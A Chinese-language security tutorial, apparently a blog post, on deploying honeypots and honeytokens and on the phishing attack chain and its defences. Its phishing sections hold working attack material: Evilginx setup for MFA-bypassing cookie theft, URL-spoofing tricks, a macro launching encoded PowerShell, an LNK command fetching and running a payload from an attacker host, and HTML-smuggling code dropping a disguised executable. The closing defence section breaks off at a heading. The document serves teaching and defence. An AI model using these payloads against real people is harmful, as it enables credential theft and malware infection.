---

title: 蜜罐与钓鱼攻防详解
tags: \[Web 安全, 蜜罐, 钓鱼攻击, 社会工程学, 网络欺骗, 安全防御]
date: 2024-07-05

---

# 蜜罐与钓鱼攻防详解

蜜罐和钓鱼是网络安全攻防博弈中的一对镜像技术——蜜罐是防守方设下的陷阱，钓鱼是攻击方抛出的鱼饵。两者都试图欺骗对方进入自己的领地。本文从攻击和防御双重视角，系统梳理蜜罐技术的部署与反识别，以及钓鱼攻击的全链条技术与防范策略。

## 1. 蜜罐技术概述

### 1.1 什么是蜜罐

蜜罐（Honeypot）是一种安全欺骗技术，通过模拟真实的系统、服务或数据来引诱攻击者，从而检测、延迟或分析攻击行为。蜜罐没有生产价值——任何访问蜜罐的流量都可能是攻击或误操作。

    蜜罐核心价值 = 检测能力 + 情报收集 + 延迟攻击 + 消耗攻击者精力

### 1.2 蜜罐分类

    蜜罐分类
    ├── 按交互程度
    │   ├── 低交互蜜罐 (Low-Interaction)
    │   │   ├── 模拟协议和服务（不提供真正OS）
    │   │   ├── 风险低，部署简单
    │   │   ├── 容易被识别
    │   │   └── 代表: Honeyd, Cowrie(基础模式), Glutton
    │   ├── 中交互蜜罐 (Medium-Interaction)
    │   │   ├── 模拟更复杂的应用层行为
    │   │   ├── 不提供完整的OS交互
    │   │   └── 代表: Cowrie(高级模式), Conpot, Dionaea
    │   └── 高交互蜜罐 (High-Interaction)
    │       ├── 真实OS + 真实服务 + 真实漏洞
    │       ├── 收集最完整攻击数据
    │       ├── 风险高（可能被攻破后横向移动）
    │       └── 代表: 真实系统+监控, T-Pot中的高交互组件
    ├── 按用途
    │   ├── 生产蜜罐 (Production)
    │   │   └── 部署在生产网络中，用于检测和防御
    │   ├── 研究蜜罐 (Research)
    │   │   └── 用于研究攻击者行为、技术和工具
    │   └── 蜜标 (Honeytoken)
    │       └── 嵌入真实系统中的虚假数据（假文件/假凭据/假Cookie）
    ├── 按目标
    │   ├── 服务端蜜罐
    │   │   ├── SSH蜜罐 → 收集爆破凭据和Shell行为
    │   │   ├── Web蜜罐 → 收集应用层攻击
    │   │   ├── 数据库蜜罐 → 收集数据窃取行为
    │   │   └── IoT蜜罐 → 收集物联网攻击
    │   └── 客户端蜜罐
    │       └── 主动访问恶意站点，检测浏览器/插件漏洞利用
    └── 按部署形式
        ├── 物理蜜罐 → 真实物理机器
        ├── 虚拟蜜罐 → 虚拟机/容器
        └── 云蜜罐 → 部署在公有云

### 1.3 蜜罐的法律与伦理边界

蜜罐运营需要注意：

- **诱捕 vs 诱导**：蜜罐应被动等待攻击者，不能主动引诱无辜用户

- **隐私保护**：收集的攻击数据可能包含攻击者的个人信息，需合理使用

- **通知义务**：某些司法管辖区要求告知网络中有监控系统

- **出口控制**：蜜罐被攻破后不应成为攻击他人的跳板

---

## 2. 各类蜜罐实战部署

### 2.1 SSH 蜜罐——Cowrie

Cowrie 是最流行的 SSH/Telnet 蜜罐，能记录攻击者的所有操作，包括 Shell 命令、文件下载、暴力破解行为。

#### 安装部署

```bash
# Docker部署（推荐）
docker run -d \
    --name cowrie \
    -p 2222:2222 \
    -p 2223:2223 \
    -v cowrie-etc:/cowrie/cowrie-git/etc \
    -v cowrie-var:/cowrie/cowrie-git/var \
    cowrie/cowrie:latest

# 或直接安装
git clone https://github.com/cowrie/cowrie.git
cd cowrie
cp etc/cowrie.cfg.dist etc/cowrie.cfg

# 修改配置: etc/cowrie.cfg
[ssh]
listen_port = 2222
hostname = db-prod-01

[telnet]
enabled = false

# 启动
bin/cowrie start
```

#### Cowrie 收集的情报

```bash
# === 暴力破解凭据记录 ===
# var/log/cowrie/cowrie.json
# 每条记录包含:
# - 攻击源IP
# - 尝试的用户名和密码
# - 登录时间/频率
# - 客户端SSH版本

# 高频爆破用户/密码分析
cat var/log/cowrie/cowrie.json | jq 'select(.eventid=="cowrie.login.failed")' | \
    jq -r '.username + " : " + .password' | sort | uniq -c | sort -rn | head -20

# === Shell命令记录 ===
# 攻击者成功登录后执行的命令
# 常见: uname -a, cat /proc/cpuinfo, wget下载木马
cat var/log/cowrie/cowrie.json | jq 'select(.eventid=="cowrie.command.input")' | \
    jq -r '.input'

# === 文件下载记录 ===
# 攻击者通过wget/curl下载的文件
# 保存在 var/lib/cowrie/downloads/
# 这些文件是攻击者使用的后续工具（挖矿、DDoS木马等）

# === TTY日志回放 ===
# var/log/cowrie/tty/ 中保存了完整的终端会话录像
# 使用 bin/playlog 回放攻击者操作
bin/playlog var/log/cowrie/tty/xxx.log
```

#### Cowrie 诱饵文件

```bash
# 在Cowrie的虚假文件系统中放置诱饵
# honeyfs/etc/passwd 中写入虚假用户凭据
# 攻击者读取后尝试在其他系统使用这些凭据 → 被发现

# 创建假的AWS密钥文件
cat > honeyfs/home/admin/.aws/credentials << 'EOF'
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = us-east-1
EOF

# 攻击者使用这些凭据访问AWS时
# 会在CloudTrail中留下记录 → 溯源到攻击者IP
```

### 2.2 Web 蜜罐

#### Glastopf（经典 Web 蜜罐）

```bash
# 使用T-Pot一键部署（最方便）
# T-Pot包含了所有主流蜜罐: Cowrie, Dionaea, Glastopf, Conpot等
git clone https://github.com/telekom-security/tpotce
cd tpotce
# 按文档部署

# Glastopf核心功能:
# - 模拟PHP/MySQL Web应用
# - 自动响应RFI/LFI/SQL注入等攻击
# - 捕获攻击payload和工具
```

#### 自定义 Web 蜜罐（Python 实现）

```python
# 简易PHP Web蜜罐
from flask import Flask, request, jsonify
import json, time, os

app = Flask(__name__)

LOG_FILE = "honeypot_web.log"
TRAPS = {
    '/wp-login.php': {'status': 200, 'body': '<form method="POST">...</form>'},
    '/admin': {'status': 401, 'body': 'Unauthorized'},
    '/phpmyadmin': {'status': 200, 'body': 'phpMyAdmin login...'},
    '/.env': {'status': 200, 'body': 'APP_KEY=base64:fakeKey\nDB_PASSWORD=fakePass123'},
    '/.git/HEAD': {'status': 200, 'body': 'ref: refs/heads/master\n'},
    '/api/users': {'status': 200, 'body': '[{"id":1,"username":"admin"}]'},
}

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    full_path = '/' + path

    # 记录所有请求
    log_entry = {
        'timestamp': time.time(),
        'ip': request.remote_addr,
        'method': request.method,
        'path': full_path,
        'query_string': request.query_string.decode(),
        'headers': dict(request.headers),
        'user_agent': request.headers.get('User-Agent', ''),
        'post_data': request.get_data().decode('utf-8', errors='ignore')[:2000],
    }

    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(log_entry) + '\n')

    # 返回蜜罐响应
    if full_path in TRAPS:
        return TRAPS[full_path]['body'], TRAPS[full_path]['status']

    # SQL注入检测（日志记录+返回假数据）
    sql_patterns = ["'", '"', 'union', 'select', 'sleep', 'or 1=1', 'information_schema']
    payload_lower = request.query_string.decode().lower() + (request.get_data().decode('utf-8', errors='ignore').lower())

    for pattern in sql_patterns:
        if pattern in payload_lower:
            log_entry['alert'] = f'SQLi attempt detected: {pattern}'
            with open(LOG_FILE, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
            # 返回虚假的SQL错误来迷惑/消耗攻击者
            return "MySQL Error: You have an error in your SQL syntax; check the manual near 'users' at line 1", 500

    # 默认404
    return 'Not Found', 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

#### WordPress 蜜罐

```php
<?php
// 部署在真实的WordPress站点中作为蜜标
// 作为wp-content/uploads/下的伪装文件

// 记录访问者
$log = [
    'time' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'ua' => $_SERVER['HTTP_USER_AGENT'],
    'referer' => $_SERVER['HTTP_REFERER'] ?? '',
    'post' => file_get_contents('php://input'),
];
file_put_contents('/tmp/wp_honeylog.json', json_encode($log)."\n", FILE_APPEND);

// 返回一个无害但看起来像后门的内容
// 如果攻击者尝试利用，会暴露其工具链和C2地址
echo "<!-- wp-config backup -->";
```

### 2.3 数据库蜜罐

#### Elasticsearch 蜜罐

```bash
# 使用Docker快速部署ES蜜罐
docker run -d --name es-honeypot \
    -p 9200:9200 \
    -e "discovery.type=single-node" \
    -e "xpack.security.enabled=false" \
    elasticsearch:7.10.0

# 在ES中写入蜜标数据
curl -X PUT "localhost:9200/honeydb" -H 'Content-Type: application/json' -d '{}'

# 插入虚假凭证信息
curl -X POST "localhost:9200/honeydb/_doc" -H 'Content-Type: application/json' -d '
{
    "type": "credentials",
    "service": "AWS",
    "access_key": "AKIA_HONEYPOT_MARKER_001",
    "secret_key": "canary_token_xxxxxxxxxx",
    "database": "prod_users",
    "connection_string": "mysql://admin:Admin123!@10.0.0.50:3306/proddb"
}'

# 监控谁读取了这些数据
# 任何尝试使用这些凭据的行为都是攻击迹象
```

#### MySQL 蜜罐

```bash
# 使用MySQL蜜罐记录查询
# 参考: https://github.com/allyshka/mysql-honeypotd

# 关键: 开启查询日志记录所有攻击者操作
# 设置假数据库和假表（如 users, admin, credit_cards）
# 插入蜜标数据
# 任何从外部读取这些假数据的都是攻击行为
```

### 2.4 蜜标（Honeytoken）

蜜标是嵌入真实系统的虚假数据资源，本身没有业务价值，任何访问或使用都是可疑行为。

#### 蜜标类型

```bash
# === 1. 文件蜜标 ===
# 在文件服务器上放置伪装的重要文件
/var/www/html/internal/salary_2024.xlsx       # 财务表（含蜜标元数据）
/home/admin/backup/db_dump_2024.sql           # 数据库备份（假）
/share/confidential/merge_plan.pdf            # 并购计划（假）

# 监控：文件访问审计(inotify/Auditd)
# 告警：任何人读取这些文件 → 可能被入侵

# inotify监控蜜标访问
inotifywait -m -r /path/to/honeytokens/ -e access,open,modify |
while read path action file; do
    echo "[ALERT] Honeytoken accessed: $path$file by $(lsof $path$file | tail -1)"
done

# === 2. 数据库蜜标 ===
# 在数据库中插入虚假高价值记录
INSERT INTO users (username, password_hash, role, is_vip)
VALUES ('honeytoken_admin', '$2y$10$fakehash...', 'admin', 1);

INSERT INTO credit_cards (card_number, cvv, expiry, cardholder)
VALUES ('4532015112830366', '123', '12/25', 'CANARY_MONITORED');

# 监控规则:
# SELECT * FROM users WHERE username='honeytoken_admin'
# 任何查询这条记录的行为都是可疑的

# === 3. API蜜标 ===
# 在代码中嵌入假API密钥
# 如 .env 文件中添加:
#    AWS_ACCESS_KEY_ID=AKIA_HONEYPOT_TRACKER_001
#    GITHUB_TOKEN=ghp_faketoken_honeypot_monitored

# 监控各方API密钥使用日志
# 任何使用假密钥的行为 → 密钥泄露

# === 4. Cookie/Token蜜标 ===
# 在Web应用中注入假的会话令牌
# 监控：有人使用假会话 → 会话伪造攻击

# === 5. 邮箱蜜标 ===
# 创建不存在的邮箱地址
# honeypot_ceo@example.com
# honeypot_admin@example.com
# 监控：收到邮件 → 内部信息泄露或社工攻击
```

#### Canary Token 部署

Canary Token 是预制的蜜标服务，部署极其简单：

```bash
# 使用Canarytokens.org或自建
# https://canarytokens.org/

# 常用Canary Token类型:
# 1. Web Bug Token - 嵌入文件/邮件的URL，打开即告警
# 2. DNS Token - 特定域名的DNS查询告警
# 3. AWS Key Token - 使用该AWS密钥即告警
# 4. SQL Token - 特定SQL查询即告警

# 自建Canarytokens
docker run -d -p 80:80 thinkst/canarytokens

# 创建Token示例
# AWS密钥Token → 放入假.env文件 → 在GitHub泄露时实时告警
# URL Token → 嵌入Word文档 → 文档被打开时告警（含IP、User-Agent）
# DNS Token → 配置为内网域名 → 内网扫描时触发
```

---

## 3. 蜜网（Honeynet）架构

### 3.1 T-Pot——一键部署蜜网

T-Pot 是最成熟的开源蜜网平台，在一个 Ubuntu 系统上部署 20+蜜罐：

```bash
# T-Pot安装
# 需要: Ubuntu 20.04+, 8GB RAM, 128GB SSD
git clone https://github.com/telekom-security/tpotce
cd tpotce/iso/installer/
./tpot.sh --type=user

# 部署的蜜罐包括:
# adbhoney    - Android ADB蜜罐
# ciscoasa    - Cisco ASA蜜罐
# citrixhoneypot - Citrix蜜罐
# conpot      - ICS/SCADA蜜罐
# cowrie      - SSH/Telnet蜜罐
# ddospot     - DDoS蜜罐
# dionaea     - 多协议蜜罐(SMB/HTTP/FTP/MSSQL/MySQL)
# elasticpot  - Elasticsearch蜜罐
# endlessh    - SSH迟缓蜜罐(消耗攻击者时间)
# glutton     - 万能协议蜜罐(自动学习协议指纹)
# heralding   - 凭证收集蜜罐
# honeypots   - Python蜜罐集合
# honeytrap   - 高级交互蜜罐
# mailoney    - SMTP蜜罐
# medpot      - 医疗协议蜜罐
# rdpy        - RDP蜜罐
# snare       - Web应用蜜罐
# tannermemes - 模拟响应蜜罐
```

### 3.2 蜜网架构设计

                    Internet
                        │
                ┌───────▼────────┐
                │  边界路由器    │
                │  (流量镜像)    │
                └───────┬────────┘
                        │
             ┌──────────┼──────────┐
             │          │          │
        ┌────▼───┐ ┌───▼────┐ ┌───▼────┐
        │ 蜜罐区  │ │ 生产区  │ │ 管理区  │
        │        │ │        │ │        │
        │Cowrie  │ │Web App │ │ELK     │
        │Dionaea │ │DB      │ │IDS     │
        │Conpot  │ │...     │ │Monitor │
        │Glastopf│ │        │ │        │
        └────┬───┘ └────────┘ └────────┘
             │
        ┌────▼─────────────────┐
        │  出站流量严格控制    │
        │  - 限制连接数/频率   │
        │  - 只允许已知目标    │
        │  - 禁止访问内网      │
        │  - 注入蜜标数据      │
        └──────────────────────┘

### 3.3 蜜罐出站流量控制（防跳板）

这是蜜罐部署最关键也是容易忽略的环节。蜜罐被攻破后绝不能成为攻击者的跳板。

```bash
# === iptables规则限制蜜罐出站 ===

# 1. 默认禁止出站
iptables -P FORWARD DROP

# 2. 只允许响应已有连接
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# 3. 限制新建出站连接数量（防DDoS）
iptables -A FORWARD -p tcp --syn -m limit --limit 10/minute --limit-burst 5 -j ACCEPT

# 4. 允许DNS查询（攻击者常用DNS隧道）
iptables -A FORWARD -p udp --dport 53 -j ACCEPT
iptables -A FORWARD -p tcp --dport 53 -j ACCEPT

# 5. 允许到特定安全研究目标的出站（如wget下载payload）
# 只允许已知安全的IP范围
iptables -A FORWARD -d 1.2.3.0/24 -j ACCEPT

# 6. 禁止访问内网
iptables -A FORWARD -d 10.0.0.0/8 -j DROP
iptables -A FORWARD -d 172.16.0.0/12 -j DROP
iptables -A FORWARD -d 192.168.0.0/16 -j DROP

# 7. 速率限制（防挖矿/防DDoS）
iptables -A FORWARD -m hashlimit \
    --hashlimit-name honeypot_out \
    --hashlimit-above 100/sec \
    --hashlimit-burst 200 \
    --hashlimit-mode srcip \
    -j DROP

# 8. 日志记录所有被拦截的出站连接
iptables -A FORWARD -j LOG --log-prefix "HONEYPOT_OUT_DROP: "
```

---

## 4. 蜜罐反识别技术

高级攻击者会主动识别和规避蜜罐。理解反识别技术能帮助我们构建更真实的蜜罐。

### 4.1 常见的蜜罐识别方法

```bash
# === 1. 检测虚拟化环境 ===
# 攻击者检测mac地址前缀（VMware/VirtualBox/Xen有固定前缀）
ip link show | grep "link/ether"
# VMware: 00:0C:29, 00:50:56
# VirtualBox: 08:00:27
# Xen: 00:16:3E

# 检测DMI信息
dmidecode -s system-product-name
# VMware Virtual Platform / VirtualBox / KVM

# 检测CPU核心数
nproc
# 蜜罐通常只有1-2个核心

# 磁盘大小
df -h
# 小磁盘(<20GB)可疑

# 内存大小
free -m
# 小内存(<2GB)可疑

# 检测/proc下的虚拟化特征
cat /proc/scsi/scsi | grep -i vmware
cat /proc/cpuinfo | grep -i hypervisor

# === 2. 检测已知蜜罐指纹 ===
# 检查特定进程
ps aux | grep -E "cowrie|dionaea|honeyd|glastopf|conpot"

# 检查特定文件和路径
ls -la /opt/honeypot/
ls -la /etc/cowrie/
find / -name "*honey*" -o -name "*cowrie*" 2>/dev/null

# 检查端口特征（蜜罐常开大量非标端口）
ss -tlnp

# === 3. 检测网络行为异常 ===
# 尝试出站连接检测
curl http://controlled-server.com/test
ping controlled-server.com
# 如果被限制 → 可能是蜜罐

# 检测网络延迟
# 蜜罐可能在云端，和声称的地理位置延迟不匹配

# 检测时间同步
# 蜜罐时间可能与声称的时区不一致

# === 4. 检测系统行为异常 ===
# 命令历史为空
history
# (正常生产系统多少有些历史命令)

# 登录日志异常
last
who -a
# 登录来源IP单一或不合逻辑

# 进程运行时间
ps -eo pid,lstart,cmd
# 所有进程启动时间相同 → 容器/虚拟刚启动

# 尝试执行真实攻击 → 蜜罐返回预编程的响应
# 攻击者发送定制payload看响应是否机械

# === 5. 基于时间的检测 ===
# 检查uptime
uptime
# 蜜罐可能频繁重启

# 检查crontab
crontab -l
# 蜜罐通常没有定时任务
```

### 4.2 构建反识别的蜜罐

```bash
# === 1. 伪装虚拟化信息 ===
# 修改mac地址为常见的硬件厂商
ip link set eth0 address f0:de:f1:xx:xx:xx  # Dell
ip link set eth0 address 3c:d9:2b:xx:xx:xx  # HP

# 修改DMI信息（需在虚拟机配置层面）
# libvirt:
#   <sysinfo type='smbios'>
#     <system>
#       <entry name='product'>PowerEdge R740</entry>
#       <entry name='manufacturer'>Dell Inc.</entry>
#     </system>
#   </sysinfo>

# === 2. 模拟真实系统活动 ===
# 添加假的历史命令
cat >> /root/.bash_history << 'EOF'
ls -la /var/log/
tail -f /var/log/nginx/access.log
mysql -u root -p
ps aux | grep java
df -h
du -sh /var/lib/mysql/
vim /etc/nginx/nginx.conf
uptime
crontab -l
EOF

# 模拟登录记录
echo "pts/0        192.168.1.100    Mon Jun 24 09:15 - 18:30  (09:15)" >> /var/log/wtmp

# 添加假crontab
echo "0 2 * * * /opt/scripts/backup.sh" >> /var/spool/cron/crontabs/root

# 创建看起来真实的目录结构
mkdir -p /opt/app/{config,logs,scripts,backup}
mkdir -p /data/{mysql,redis,uploads}

# 填充一些看起来真实的文件
dd if=/dev/urandom of=/opt/app/logs/app.log bs=1M count=50
dd if=/dev/urandom of=/data/mysql/ibdata1 bs=1M count=200

# === 3. 增加网络延迟 ===
# 使用tc添加符合地理位置的延迟
# 如果蜜罐模拟位于日本的服务器:
tc qdisc add dev eth0 root netem delay 80ms 10ms

# === 4. 模拟真实服务的细微行为 ===
# 不只是返回固定Banner
# 而是在不同状态下返回不同响应
# 接受无效命令时给出符合版本的错误
```

---

## 5. 钓鱼攻击全链条

### 5.1 钓鱼攻击分类

    钓鱼攻击
    ├── 按目标精确度
    │   ├── 广撒网(Phishing) → 群发大量钓鱼邮件
    │   ├── 鱼叉式(Spear Phishing) → 针对特定个人/组织
    │   └── 鲸钓(Whaling) → 针对高管/CEO
    ├── 按攻击渠道
    │   ├── 邮件钓鱼 → 最传统，占比最高
    │   ├── 短信钓鱼(Smishing) → 伪装银行/快递/运营商
    │   ├── 语音钓鱼(Vishing) → 伪装客服/IT支持
    │   ├── 社交媒体钓鱼 → 伪装好友/同事私信
    │   ├── 二维码钓鱼(Quishing) → 恶意二维码
    │   ├── 搜索引擎钓鱼 → SEO投毒+钓鱼页面
    │   └── USB钓鱼 → 恶意U盘投放
    ├── 按技术手段
    │   ├── 凭证钓鱼 → 窃取用户名密码
    │   ├── 水坑攻击 → 感染目标常访问的网站
    │   ├── 会话劫持 → 窃取Cookie/Token
    │   ├── MFA疲劳 → 反复推送MFA直到受害者批准
    │   └── 中间人钓鱼 → Evilginx反向代理拦截
    └── 按攻击目的
        ├── 获取凭证 → 初始访问
        ├── 植入恶意软件 → 持续控制
        ├── 窃取数据 → 商业间谍
        └── 金融欺诈 → 虚假汇款

### 5.2 邮件钓鱼全流程

```bash
# === 阶段一: 目标信息收集 ===
# 参见信息收集文章
# 重点关注:
# - 员工邮箱列表 (Hunter.io/theHarvester)
# - 组织架构 (LinkedIn → 汇报关系)
# - 合作供应商 (用于伪装)
# - 当前项目和工作节奏
# - 公司使用的邮件网关和安全产品

# === 阶段二: 基础设施搭建 ===
# 1. 注册相似域名 (Typosquatting)
# examp1e.com (1代替l)
# example-verify.com
# example-secure.com

# 2. 配置邮件服务器
# 使用Postfix + DKIM + SPF + DMARC
# 让邮件看起来更可信

# 3. 搭建钓鱼页面
# 克隆目标登录页面
wget -r -l 2 -p -k https://target.com/login
# 修改表单提交指向攻击服务器

# === 阶段三: 钓鱼邮件制作 ===

# 常见钓鱼邮件模板类型:
# 1. 密码过期 → 诱导点击"重置密码"链接
# 2. 新消息通知 → 伪装Teams/Slack/Outlook通知
# 3. 共享文件 → 伪装SharePoint/Google Drive
# 4. 薪资调整 → 诱导打开恶意附件
# 5. 安全警报 → 伪装IT安全通知
# 6. 快递通知 → 伪装DHL/FedEx/UPS
# 7. 发票/合同 → 伪装供应商/客户
# 8. 紧急CEO指令 → CEO欺诈(BEC攻击)

# === 阶段四: 发送 ===
# 绕过SPF/DKIM/DMARC的常见手法
# 1. 使用受信任的第三方发件服务（SendGrid/AWS SES）
# 2. 利用被攻破的合法邮件服务器
# 3. 伪造显示名称（From: CEO Name <spoofed@gmail.com>）
# 4. Reply-To字段指向攻击者邮箱

# === 阶段五: 监控与后续利用 ===
# 记录所有点击/IP/User-Agent/提交的凭证
```

### 5.3 Evilginx——高级中间人钓鱼

Evilginx 是新一代钓鱼框架，通过反向代理实时拦截凭证和会话 Cookie，可以绕过 MFA。

```bash
# Evilginx工作原理:
# 用户 → Evilginx → 真实目标站点
# Evilginx作为中间人，透明代理所有流量
# 拦截登录后的Session Cookie

# 安装Evilginx
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make

# 启动
./bin/evilginx -p ./phishlets/

# 配置域名和IP
config ipv4 external 1.2.3.4
config domain evilginx.example.com

# 加载Phishlet（预制的钓鱼场景）
phishlets hostname linkedin linkedin.example.com
phishlets enable linkedin

# 创建诱饵URL
lures create linkedin
lures get-url 0
# 返回: https://linkedin.example.com/AbCdEfGh

# 受害者点击链接 → 看到真实的LinkedIn登录页面
# → 输入用户名密码 → Evilginx透明代理到真实LinkedIn
# → 输入MFA → Evilginx透明代理
# → 登录成功 → Evilginx捕获Session Cookie
# → 攻击者使用Cookie直接登录（无需密码和MFA）

# 查看捕获的凭据和会话
sessions
sessions <id>
```

Evilginx 的关键优势是可以**绕过 MFA/2FA**——捕获的是认证完成后的 Session Cookie，MFA 已经通过了。

### 5.4 Gophish——开源钓鱼测试平台

```bash
# Docker部署Gophish
docker run -d \
    --name gophish \
    -p 3333:3333 \
    -p 8081:80 \
    gophish/gophish

# Web界面: https://localhost:3333
# 初始密码在docker logs gophish中

# Gophish功能:
# 1. Landing Page管理 → 导入/克隆钓鱼页面
# 2. Email Template管理 → 所见即所得编辑
# 3. Sending Profile → 配置SMTP发件
# 4. 用户组管理 → 导入目标列表
# 5. Campaign管理 → 创建/发送/追踪钓鱼活动
# 6. 实时Dashboard → 查看发送/打开/点击/提交统计

# 高级功能:
# - A/B测试不同邮件模板
# - 自动发送提醒邮件
# - 用户训练模式（点击后跳转到安全意识教育页面）
# - Webhook推送结果
# - 与AD/LDAP集成导入目标
```

### 5.5 社交媒体钓鱼

```bash
# === LinkedIn钓鱼 ===
# 1. 创建伪装HR/猎头账号
# 2. 连接目标公司员工
# 3. 发送"工作机会"带恶意链接
# 4. 或发送恶意PDF简历附件

# === 微信/钉钉/飞书钓鱼 ===
# 1. 扫描公司门口的二维码或伪装WiFi
# 2. 伪装内部通知消息（如薪资条、报销单）
# 3. 伪装IT支持的远程协助请求

# === 伪装WiFi钓鱼 ===
# 创建与公司WiFi同名的虚假AP
# 用户连接后重定向到钓鱼登录页面
# 窃取域凭据（配合Captive Portal）
```

---

## 6. 钓鱼页面欺骗技术

### 6.1 URL 欺骗

```bash
# === 1. 相似域名 ===
# 注册与目标相似的域名
https://www.example-secure.com
https://www.examp1e.com
https://login.example.co
https://example.sign-in.xyz
https://example.com.tk       (利用.tk等免费域名)
https://examp1e.com           (1替代l)
https://exarnple.com          (rn替代m)

# === 2. 子域名伪装 ===
https://login.example.com.attacker.com
# 移动端或窄屏幕看不完整URL

# === 3. URL重定向滥用 ===
# 利用合法网站的重定向跳转
https://trusted-site.com/redirect?url=https://attacker.com/phishing

# === 4. Punycode同形异义字攻击 ===
# 使用国际字符注册看起来一样的域名
# 英文字母a和西里尔字母а看起来相同但Unicode不同
https://www.аррӏе.com   ← 使用西里尔字母拼写的apple

# === 5. @符号混淆 ===
https://login.example.com@attacker.com
# 浏览器将@前的内容视为用户名
# 实际访问的是attacker.com

# === 6. data: URI钓鱼 ===
data:text/html,<script>location.href="https://attacker.com"</script>
# 浏览器地址栏显示data:协议但内容可控

# === 7. IP地址混淆 ===
# 将IP转化为十进制或十六进制
# http://2130706433/ → http://127.0.0.1/
# http://0x7f000001/ → http://127.0.0.1/
```

### 6.2 页面克隆增强

```bash
# === 1. 添加合法SSL证书 ===
# 使用Let's Encrypt为钓鱼域名申请真实TLS证书
certbot certonly --standalone -d phishing.example.com
# 绿色锁标志增加可信度

# === 2. 克隆完整的登录流程 ===
# 不只是克隆登录页
# 还要克隆: 密码错误提示、MFA页面、成功登录后的跳转

# === 3. 浏览器锁屏模拟 ===
# JavaScript模拟浏览器全屏 + 伪造地址栏
# 使用HTML5 Fullscreen API
document.documentElement.requestFullscreen();
# 然后绘制假的地址栏覆盖在浏览器上

# === 4. 弹出窗口去地址栏 ===
window.open('phishing.html', '_blank', 'location=no,toolbar=no');
```

### 6.3 附件钓鱼

```bash
# === 1. 恶意宏文档 ===
# Word/Excel/VBA宏
Sub AutoOpen()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -enc <base64_payload>", 0
End Sub

# 伪装内容: "此文档受保护，请点击启用编辑并启用内容查看"

# === 2. 快捷方式钓鱼(LNK) ===
# 创建恶意.LNK文件
# 图标伪装成PDF/Word图标
# 目标指向:
powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"

# === 3. ISO/IMG镜像 ===
# 邮件附件发送ISO文件
# Windows挂载后自动打开
# ISO内包含恶意LNK+DLL
# 可以绕过Mark-of-the-Web(MoTW)保护

# === 4. HTML走私(HTML Smuggling) ===
# 在HTML文件中嵌入恶意二进制数据
# 浏览器自动解码并"下载"到用户机器
# 绕过邮件网关的附件过滤
<html>
<body>
<script>
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}
var b64 = "TVqQAAMAAAAEAAAA..."; // Base64编码的恶意EXE
var data = base64ToArrayBuffer(b64);
var blob = new Blob([data], {type: 'application/octet-stream'});
var a = document.createElement('a');
a.href = window.URL.createObjectURL(blob);
a.download = 'invoice_2024.pdf.exe';
document.body.appendChild(a);
a.click();
</script>
</body>
</html>

# === 5. PDF钓鱼 ===
# 在PDF中嵌入JavaScript
# 或使用PDF中的链接/按钮引导到钓鱼页面
# 利用PDF阅读器的漏洞CVE实现代码执行
```

---

## 7. 钓鱼检测与防御

### 7.1 技术层防御

```bash
# === 1. 邮件安全网关 ===
# SPF (Sender Policy Framework)
# 验证发件服务器IP是否被授权
dig TXT example.com | grep spf
# "v=spf1 ip4:203.0.113.0/24 -all"
# -all: 严格的拒绝策略

# DKIM (DomainKeys Identified Mail)
# 邮件签名验证，确保邮件未被篡改
dig TXT default._domainkey.example.com

# DMARC (Domain-based Message Authentication, Reporting and Conformance)
# 定义SPF/DKIM失败时的处理策略
dig TXT _dmarc.example.com
# "v=DMARC1; p=reject; rua=mailto:dmarc@example.com"
# p=reject: 拒绝未通过验证的邮件

# === 2. 邮件内容过滤 ===
# - URL信誉检查（VirusTotal/Google Safe Browsing API集成）
# - 附件沙箱分析（在隔离环境打开附件）
# - 发件人身份分析（相似域名检测）
# - 自然语言处理（检测钓鱼话术）
# - 邮件头分析（X-Originating-IP, Received链）

# === 3. 浏览器层防御 ===
# Google Safe Browsing (Chrome)
# Microsoft SmartScreen (Edge)
# 浏览器自动拦截已知钓鱼站点

# === 4. 端点安全 ===
# - EDR检测可疑进程（Word→PowerShell→网络连接）
# - 禁用Office宏（或限制签名宏）
# - AppLocker/WDAC限制可执行文件
# - ASR (Attack Surface Reduction)规则
```

### 7.2 安全意识培训

```bash
# === 识别钓鱼邮件训练要点 ===
# 1. 检查发件人地址（不是显示名称）
#    From显示"公司IT"但实际地址是gmail.com

# 2. 检查链接实际目标
#    悬停鼠标查看链接真实URL
#    注意相似域名

# 3. 注意紧迫感话术
#    "您的账户将在24小时内被删除"
#    "立即行动，否则XXX"

# 4. 注意异常请求
#    IT从不通过邮件要求输入密码
#    CEO不会邮件要求紧急转账

# 5. 注意语法和拼写错误
#    翻译软件的痕迹（中文邮件却用英文逐字翻译的语法）

# 6. 注意异常附件
#    发票是.exe?
#    简历是.zip? (里面是.lnk)
#    文档要求启用宏?

# === 定期钓鱼演练 ===
# 使用Gophish每季度对全员测试
# 统计点击率、提交凭据率
# 对中招员工进行额外培训
# 持续追踪指标改善
```

### 7.3 域名监控与下架

```bash
# === 1. 主动发现钓鱼域名 ===
# 监控新注册的相似域名
# 工具: dnstwist
dnstwist --registered example.com
dnstwist --ssdeep example.com > report.html

# 监控SSL证书透明度日志中的相似域名
# 搜索包含品牌关键词的新证书

# 2. 对发现的钓鱼域名采取措施
# 向域名注册商举报滥用
# 向托管服务商举报
# 提交到Google Safe Browsing/PhishTank
# 反制: 向钓鱼站点填充虚假信息（消耗攻击者精力）

# 3. 提供员工举报渠道
# 邮箱按钮: "Report Phishing"
# Outlook "报告钓鱼"插件
# 一键举报并自动分析
```

### 7.4 MFA 抗钓鱼增强

